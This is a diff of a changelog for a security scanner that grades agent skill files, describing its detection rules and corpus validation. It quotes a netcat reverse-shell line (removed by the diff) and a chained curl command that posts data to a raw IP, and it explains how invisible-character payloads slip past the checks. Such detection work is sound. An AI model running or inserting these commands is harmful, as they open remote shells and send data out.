@@ -70,8 +70,8 @@ has always accepted. The root marker and the manifest definition disagreeing is
 what produced the gap; defining one in terms of the other is what stops it
 coming back.
 
-Priced by construction rather than by corpus: the gap shape is vanishingly
-rare in the corpus used for validation, so a re-run is byte-identical to
+Priced by construction rather than by corpus: no sample in the validation
+benchmark has the gap shape, so the bench re-run is byte-identical to
 v0.8.0. Zero prevalence is evidence the change is cheap, not evidence the gap
 was harmless — an evasion is valuable to an attacker precisely because it is
 absent from the corpus defenders measure against.
@@ -112,7 +112,7 @@ Registry checksum unchanged at `2414c32f04000b5d`; schema unchanged at `1.5`.
 
   **Validated against an internal corpus.** SD-003 findings fall on honest
   input and are essentially unmoved on hostile input; two honest samples come
-  off a `permission_hygiene` gate and no hostile sample moves. The
+  off a `permission_hygiene` gate and no hostile sample in the slice moves. The
   whole-reference rule was added after that run and re-measured on the same
   population, so the shipped behaviour is the measured one.
 
@@ -205,9 +205,9 @@ incidentally via SD-007.
 **Validated against an internal corpus.** False positives on honest input do
 **not** rise on either layout, and reverse-shell recall rises on both. On the
 full pool SD-025 is the **sole** reason security crosses the gate (worse than
-B) for a substantial number of hostile samples — **with zero new honest
-crossings on either layout** (the few honest files it fires on were already
-flagged by another security rule). The predicate separates the two populations
+B) for a substantial number of hostile samples — **with no new honest crossing
+on either layout across the pool** (the few honest files it fires on were
+already flagged by another security rule). The predicate separates the two populations
 strongly; its residual false positives are security and sysadmin reference docs
 that quote revshell payloads verbatim.
 
@@ -265,10 +265,10 @@ findings) — branch on the field, not on the code.
   statement did any of a *list of dangerous things*. A deny-list has to
   enumerate every dangerous thing a statement can do, fails open on
   everything it forgot, and ships in a public repo where an attacker reads
-  it. It forgot reverse shells entirely: in a `SKILL.md` fenced block,
-  `echo "https://example.com" && nc -e /bin/sh 10.0.0.1 4444` graded
-  **security A** on a Medium/`transparency` note, while the identical line
-  in a `run.sh` graded **D** — the whole difference was `isDocFile`. Two
+  it. It forgot reverse shells entirely: in a `SKILL.md` fenced block, a
+  chained URL-plus-reverse-shell statement graded **security A** on a
+  Medium/`transparency` note, while the identical line in a `run.sh` graded
+  **D** — the whole difference was `isDocFile`. Two
   more holes on the same rule: `suspiciousEndpoint` was applied to the
   *first* URL of a statement only, so
   `curl https://api.example.com/v1 && curl -X POST http://185.220.101.5/collect`
@@ -336,8 +336,8 @@ field.
 Validated against an internal corpus at `--fail-on-axis security=B`,
 installed layout — the gate metric here is the **security axis alone**, which
 is what that flag tests. Precision improves slightly and **nothing on the
-hostile side moves**: behaviour-class recall and the hostile finding count are
-both unchanged.
+hostile side moves**: behaviour-class recall is unchanged to four decimal
+places and the hostile finding count is identical.
 
 - **SD-002: a ZWJ directly between two emoji codepoints is not a hidden
   payload** (`d3c2c92`). `isInvisibleRune` correctly treats U+200D ZERO
@@ -359,8 +359,8 @@ both unchanged.
   was exempt (`1d170ad`). The exemption is applied per rune, not only to a
   line carrying a single invisible rune, and at most `maxExemptZWJPerLine`
   = 4 per line qualify; past that none are exempted and the whole line
-  counts as before, which is what closes the covert channel of encoding one
-  bit per adjacent emoji pair. A ZWSP/ZWNJ (not ZWJ), and any invisible
+  counts as before, which is what keeps the carve-out from becoming an
+  unbounded covert channel. A ZWSP/ZWNJ (not ZWJ), and any invisible
   rune without a pictograph on both sides, fire exactly as before — those
   separate cleanly. A hard gate was required before shipping: the carve-out
   fires on **zero** hostile SD-002 findings, not merely a favourable ratio.
@@ -521,7 +521,7 @@ both unchanged.
   SD-007 read the URL from the backslash-joined statement but did not skip the
   lines it consumed, so a wrapped command produced one finding per line —
   three for a single call. Found in review of this PR; it removed a small
-  number of duplicate findings, few enough that the headline figures held.
+  number of duplicate findings, few enough that the headline results held.
 - **`curl -d @file` counts as sending local state again.** `exfiltratesLocalData`
   returned early unless it saw `$(`, so the `@`-prefixed upload idiom —
   `-d @path`, `--data-binary @path`, `-F field=@path`, the form the repo's own
@@ -544,7 +544,8 @@ both unchanged.
   padding, so a slash test discarded a quarter of all genuine payloads. A path
   is several word-like segments — `claude/skills/CORE/USER/Art` flips case on
   ~2% of its character boundaries where random base64 flips on ~33%. The
-  shipped test discards **no** genuine payload. Found in review of this PR.
+  shipped test discarded **no** genuine payload in the validation set, and buys
+  that by not catching every corpus path token. Found in review of this PR.
 
 
 ### Changed
@@ -620,7 +621,7 @@ Engine-review wave. Registry checksum unchanged
   fingerprint of the emitted shape — changing the output without bumping the
   version now fails the build. Bump procedure documented in
   `docs/development-guide.md`.
-- README documents the warn-without-failing CI recipe for exit code `1`
+- README documents the warn-without-failing CI recipe for exit code `1`:
   a `|| [ $? -eq 1 ]` one-liner and an explicit `case` form emitting
   `::warning::`, plus a caution that `|| true` swallows exit `3`.
 
